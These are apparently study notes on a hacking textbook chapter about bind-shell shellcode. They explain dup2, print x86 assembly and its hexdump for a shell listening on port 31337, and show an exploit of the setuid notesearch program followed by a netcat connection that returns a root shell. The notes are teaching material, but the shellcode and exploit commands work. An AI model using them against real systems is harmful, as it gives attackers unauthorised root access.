Standard input, standard output, and standard error are the 3 standard file descriptors used by programs to perform standard I/O
Sockets, too, are just file descriptors that can be read from and written to
By simply swapping the standard input, output, and error of the spawned shell with the connected socket file descriptor, the shell will write output and errors to the socket and read its input from the bytes that the socket received
There is a system call specifically for duplicating file descriptors, called dup2
This is system call for number 63

__________________________________________________________________________________
reader@hacking:~/booksrc $ grep dup2 /usr/include/asm-i386/unistd.h
#define __NR_dup2
 63

reader@hacking:~/booksrc $ man 2 dup2
DUP(2)                        Linux Programmer's Manual                    DUP(2)

NAME
       dup, dup2 - duplicate a file descriptor

SYNOPSIS
       #include<unistd.h>
       
       int dup(int oldfd);
       int dup2(int oldfd, int newfd);

DESCRIPTION
       dup() and dup2() create a copy of the file descriptor oldfd.

       dup2() makes newfd be the copy of oldfd, closing newfd first if necessary.
__________________________________________________________________________________

The bind_port.s shellcode left off with the connected socket file descriptor in EAX
The following instructions are added in the file bind_shell_beta.s to duplicate this socket into the standard I/O file descriptors; then, the tiny_shell instructions are called to execute a shell in the current process
The spawned shell's standard input and output file descriptors will be the TCP connection, allowing remote shell access

NEW INSTRUCTIONS FROM bind_shell_beta.s
__________________________________________________________________________________
; dup2(connected socket, {all 3 standard I/O file descriptors})
  mov ebx, eax      ; Move socket FD in ebx
  push BYTE 0x3F    ; dup2 syscall #63
  pop eax
  xor ecx, ecx      ; ecx = 0 = standard input
  int 0x80          ; dup(c, 0)
  mov BYTE al, 0x3F ; dup2 syscall #63
  inc ecx           ; ecx = 1 = standard output
  int 0x80          ; dup(c, 1)
  mov BYTE al, 0x3F ; dup2 syscall #63
  inc ecx           ; ecx = 2 = standard error
  int 0x80          ; dup(c, 2)

; execve(const char *filename, char *const argv [], char *const envp[])
  mov BYTE al, 11   ; execve syscall #11
  push edx          ; push some nulls for string termination
  push 0x68732f2f   ; push "//sh" to the stack
  push 0x6e69622f   ; push "/bin" to the stack
  mov ebx, esp      ; Put the address of "/bin//sh" into ebx via esp
  push edx          ; push 32-bit null terminator to stack
  mov edx, esp      ; This is an empty array for envp
  push ebx          ; push string addr to stack above null terminator
  mov ecx, esp      ; This is the argv array with string ptr
  int 0x80          ; execve("/bin//sh", ["/bin//sh", NULL], NULL)
__________________________________________________________________________________

When this shellcode is assembled and used in an exploit, it will bind to port 31337 and wait for an incoming connection
In the output below, grep is used to quickly check for null bytes
At the end, the process hangs waiting for a connection
__________________________________________________________________________________
reader@hacking:~/booksrc $ nasm bind_shell_beta.s

reader@hacking:~/booksrc $ hexdump -C bind_shell_beta | grep --color=auto 00
00000000 6a 66 58 99 31 db 43 52 6a 01 6a 02 89 e1 cd 80 |jfX.1.CRj.j.....|
00000010 89 c6 6a 66 58 43 52 66 68 7a 69 66 53 89 e1 6a |..jfXCRfhzifS..j|
00000020 10 51 56 89 e1 cd 80 b0 66 43 43 53 56 89 e1 cd |.QV.....fCCSV...|
00000030 80 b0 66 43 52 52 56 89 e1 cd 80 89 c3 6a 3f 58 |..fCRRV......j?X|
00000040 31 c9 cd 80 b0 3f 41 cd 80 b0 3f 41 cd 80 b0 0b |1....?A...?A....|
00000050 52 68 2f 2f 73 68 68 2f 62 69 6e 89 e3 52 89 e2 |Rh//shh/bin..R..|
00000060 53 89 e1 cd 80                                  |S....|
00000065

reader@hacking:~/booksrc $ export SHELLCODE=$(cat bind_shell_beta)

reader@hacking:~/booksrc $ ./getenvaddr SHELLCODE ./notesearch
SHELLCODE will be at 0xbffff97f

reader@hacking:~/booksrc $ ./notesearch $(perl -e
 'print "\x7f\xf9\xff\xbf"x40')
[DEBUG] found a 33 byte note for user id 999
-------[ end of note data ]-------
__________________________________________________________________________________

From another terminal window, the program netstat is used to find the listening port
Then, netcat is usded to connect to the root shell on that port

__________________________________________________________________________________
reader@hacking:~/booksrc $ sudo netstat -lp | grep 31337
tcp         0     0   *:31337          *:*             LISTEN       25604/notesearch
reader@hacking:~/booksrc $ nc -vv 127.0.0.1 31337
localhost [127.0.0.1] 31337 (?) open
whoami
root
__________________________________________________________________________________



                  Notes
      In the previous chapter, we created a socket that is listening on port 31337
      Now, we use the socket file descriptor and set the stdout, stdin and stderr to the socket
         In the process, the first push is to zero out the EAX
         After that, we just set the value in AL
      Then, we execve /bin/sh (here, stdin, stdout, stderr all point to the socketfd
      So, the shell can execute remotely)